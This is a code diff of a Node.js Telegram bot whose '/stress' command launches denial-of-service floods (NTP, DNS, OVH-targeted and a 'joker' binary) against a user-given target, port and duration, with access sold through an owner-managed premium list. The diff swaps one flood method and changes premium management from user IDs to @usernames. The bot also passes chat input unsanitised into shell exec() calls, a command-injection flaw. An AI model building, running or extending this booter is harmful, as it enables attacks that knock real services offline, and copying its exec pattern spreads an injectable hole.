@@ -367,7 +367,7 @@ bot.onText(/\/stress (.+) (.+) (.+) (.+)(?: (.+))?/, (msg, match) => {
       exec(`node methods/ntp.js ${target} ${port} ${duration}`)
       exec(`node methods/dns.js ${target} ${port} ${duration}`)
       exec(`node methods/ovh.js ${target} ${port} ${duration}`)
-      exec(`./joker GET ${target} ${port} ${duration} 8500`)
+      exec(`node methods/ntp.js ${target} ${port} ${duration}`)
       break;
     case 'dns':
       command = `node methods/dns.js ${target} ${port} ${duration}`
@@ -460,17 +460,17 @@ bot.onText(/\/ai (.+)/, async (msg, match) => {
 });
 
 //Tambah Premium
-bot.onText(/\/addprem (.+)/, (msg, match) => {
+bot.onText(/\/addprem @(\w+)/, (msg, match) => {
     const chatId = msg.chat.id;
-    const userId = match[1];
+    const username = match[1];
     
     if (msg.from.id.toString() === owner) {
-        if (!premiumUsers.includes(userId)) {
-            premiumUsers.push(userId);
+        if (!premiumUsers.includes(username)) {
+            premiumUsers.push(username);
             fs.writeFileSync(premiumUsersFile, JSON.stringify(premiumUsers));
-            bot.sendMessage(chatId, `User ${userId} has been added to premium users.`);
+            bot.sendMessage(chatId, `User @${username} has been added to premium users.`);
         } else {
-            bot.sendMessage(chatId, `User ${userId} is already a premium user.`);
+            bot.sendMessage(chatId, `User @${username} is already a premium user.`);
         }
     } else {
         bot.sendMessage(chatId, 'Only the owner can perform this action.');
@@ -478,17 +478,18 @@ bot.onText(/\/addprem (.+)/, (msg, match) => {
 });
 
 //Hapus Premium
-bot.onText(/\/delprem (.+)/, (msg, match) => {
+bot.onText(/\/delprem @(\w+)/, (msg, match) => {
     const chatId = msg.chat.id;
-    const userId = match[1];  
+    const username = match[1];
+    
     if (msg.from.id.toString() === owner) {
-        const index = premiumUsers.indexOf(userId);
+        const index = premiumUsers.indexOf(username);
         if (index !== -1) {
             premiumUsers.splice(index, 1);
             fs.writeFileSync(premiumUsersFile, JSON.stringify(premiumUsers));
-            bot.sendMessage(chatId, `User ${userId} has been removed from premium users.`);
+            bot.sendMessage(chatId, `User @${username} has been removed from premium users.`);
         } else {
-            bot.sendMessage(chatId, `User ${userId} is not a premium user.`);
+            bot.sendMessage(chatId, `User @${username} is not a premium user.`);
         }
     } else {
         bot.sendMessage(chatId, 'Only the owner can perform this action.');
